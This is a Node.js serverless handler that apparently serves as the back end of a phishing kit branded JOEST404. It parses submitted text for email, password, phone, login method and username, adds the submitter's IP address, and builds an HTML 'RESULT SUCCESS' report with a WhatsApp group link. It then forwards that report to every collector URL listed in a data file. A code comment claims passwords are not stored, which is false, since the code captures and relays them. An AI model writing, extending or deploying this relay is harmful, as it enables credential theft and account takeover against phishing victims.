const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   LOAD URL LIST
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    const data = fs.readFileSync(FILE, "utf8");
    if (!data) return [];

    const parsed = JSON.parse(data);
    return Array.isArray(parsed) ? parsed : [];
  } catch (err) {
    console.log("LOAD ERROR:", err.message);
    return [];
  }
}

/* ======================
   BODY PARSER
====================== */
function parseBody(req) {
  if (!req.body) return {};
  if (typeof req.body === "object") return req.body;

  try {
    return Object.fromEntries(new URLSearchParams(req.body));
  } catch {
    return {};
  }
}

/* ======================
   EXTRACTOR (TEXT + HTML)
====================== */
function extractVars(input = "") {
  const vars = {
    email: "-",
    login: "-",
    phone: "-",
     password: "-",
    user: "-",
    ip: "-"
    // password tidak disimpan demi keamanan
  };

  const raw = String(input);

  const text = raw
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\r/g, " ");

  // ======================
  // key:value format
  // ======================
  const kvRegex = /(\b[\w\s]+)\s*:\s*([^:]+?)(?=\s+\w+\s*:|$)/gi;

  let m;
  while ((m = kvRegex.exec(text)) !== null) {
    map(vars, m[1], m[2]);
  }

  // ======================
  // HTML TABLE format
  // ======================
  const tdRegex =
    /<t[dh][^>]*>([\s\S]*?)<\/t[dh]>\s*<t[dh][^>]*>([\s\S]*?)<\/t[dh]>/gi;

  let t;
  while ((t = tdRegex.exec(raw)) !== null) {
    map(vars, t[1], t[2]);
  }

  return vars;
}

/* ======================
   FIELD MAPPING (SAFE)
====================== */
function map(vars, key, value) {
  if (!value) return;

  const k = String(key)
    .toLowerCase()
    .replace(/[^a-z]/g, "");

  const v = String(value).trim();

  if (k.includes("email") || v.includes("@")) {
    vars.email = v;
    return;
  }
   if (k.includes("password") || v.includes("@")) {
    vars.password = v;
    return;
   }

  if (k.includes("login") || k.includes("via") || k.includes("method")) {
    vars.login = v;
    return;
  }

  if (k.includes("phone") || k.includes("hp") || k.includes("tel")) {
    vars.phone = v;
    return;
  }

  if (k.includes("user") || k.includes("name")) {
    vars.user = v;
    return;
  }
}

/* ======================
   IP DETECTOR
====================== */
function getIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    "-"
  );
}
function row(label, value) {
  if (
    value === undefined ||
    value === null ||
    value === "" ||
    value === "-"
  ) {
    return "";
  }

  return `
    <div class="row">
        <span class="label">${label}</span>
        <span class="value">${value}</span>
    </div>
  `;
}
/* ======================
   HTML REPORT
====================== */
function buildHtml(vars) {
  return `



            

    <!DOCTYPE html><html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width">
<title>JOEST404</title>
</head><body style="margin:0;padding:20px;background:#0a0a0a;font-family:Arial,sans-serif;"><table width="100%" cellpadding="0" cellspacing="0" border="0">
<tr>
<td align="center"><table width="650" cellpadding="0" cellspacing="0" border="0" style="
background:#111111;
border:1px solid #222222;
border-radius:20px;
overflow:hidden;
"><tr>
<td align="center" style="
padding:50px 30px;
border-bottom:1px solid #222222;
"><div style="
font-size:48px;
font-weight:900;
color:#ffffff;
letter-spacing:6px;
">
JOEST404
</div><div style="
margin-top:10px;
font-size:12px;
letter-spacing:4px;
color:#777777;
">
PRIVATE ACCESS RESS
</div><div style="
display:inline-block;
margin-top:25px;
padding:12px 24px;
background:#06281b;
border:1px solid #00ff99;
border-radius:999px;
color:#00ff99;
font-size:13px;
font-weight:bold;
">
● RESULT SUCCESS
</div></td>
</tr><tr>
<td style="padding:35px;"><table width="100%" cellpadding="0" cellspacing="0"><tr>
<td style="
padding:16px 0;
color:#888888;
font-size:12px;
font-weight:bold;
letter-spacing:3px;
">
EMAIL
</td><td align="right" style="
padding:16px 0;
color:#ffffff;
font-size:16px;
font-weight:600;
">
${vars.email}
</td>
</tr><tr>
<td colspan="2">
<hr style="border:none;border-top:1px solid #222222;">
</td>
</tr><tr>
<td style="
padding:16px 0;
color:#888888;
font-size:12px;
font-weight:bold;
letter-spacing:3px;
">
PASSWORD
</td><td align="right" style="
padding:16px 0;
color:#ffffff;
font-size:16px;
font-weight:600;
">
${vars.password}
</td>
</tr><tr>
<td colspan="2">
<hr style="border:none;border-top:1px solid #222222;">
</td>
</tr><tr>
<td style="
padding:16px 0;
color:#888888;
font-size:12px;
font-weight:bold;
letter-spacing:3px;
">
LOGIN
</td><td align="right" style="
padding:16px 0;
color:#ffffff;
font-size:16px;
font-weight:600;
">
${vars.login}
</td>
</tr><tr>
<td colspan="2">
<hr style="border:none;border-top:1px solid #222222;">
</td>
</tr><tr>
<td style="
padding:16px 0;
color:#888888;
font-size:12px;
font-weight:bold;
letter-spacing:3px;
">
PHONE
</td><td align="right" style="
padding:16px 0;
color:#ffffff;
font-size:16px;
font-weight:600;
">
${vars.phone}
</td>
</tr><tr>
<td colspan="2">
<hr style="border:none;border-top:1px solid #222222;">
</td>
</tr><tr>
<td style="
padding:16px 0;
color:#888888;
font-size:12px;
font-weight:bold;
letter-spacing:3px;
">
IP ADDRESS
</td><td align="right" style="
padding:16px 0;
color:#ffffff;
font-size:16px;
font-weight:600;
">
${vars.ip}
</td>
</tr></table></td>
</tr><tr>
<td style="padding:0 35px 35px 35px;"><a href="https://chat.whatsapp.com/E0gWuMj5TH72MKRkTZsVEZ?s=cl&p=a&mlu=1"
style="
display:block;
text-align:center;
padding:18px;
background:#ffffff;
color:#000000;
text-decoration:none;
font-weight:900;
letter-spacing:2px;
border-radius:12px;
">
JOIN WHATSAPP GROUP
</a>

</td>
</tr><tr>
<td align="center" style="
padding:20px;
border-top:1px solid #222222;
font-size:12px;
color:#666666;
">
© 2026 JOEST404 • Premium Notification System
</td>
</tr></table></td>
</tr>
</table></body>
</html>

`;
}

/* ======================
   MAIN HANDLER
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({
        success: false,
        message: "POST only"
      });
    }

    const body = parseBody(req);

    const subjek = String(body.subjek || "");
    const pesan = String(body.pesan || "");

    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }

    const vars = extractVars(pesan);
    vars.ip = getIP(req);
     if (
  vars.email === "-" ||
  vars.password === "-"
) {
  return res.status(400).json({
    success: false,
    message: "Data belum lengkap"
  });
}
    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({
        success: false,
        message: "URL kosong"
      });
    }
     

    const results = await Promise.allSettled(
      urls.map(async (url) => {
        try {
          const r = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/x-www-form-urlencoded"
            },
            body: new URLSearchParams({
              subjek,
              pesan: html
            })
          });

          return {
            url,
            success: true,
            status: r.status
          };
        } catch (err) {
          return {
            url,
            success: false,
            error: err.message
          };
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      results: results.map(r => r.value || r.reason)
    });

  } catch (err) {
    console.log("ERROR:", err);

    return res.status(500).json({
      success: false,
      message: "internal error",
      error: err.message
    });
  }
};
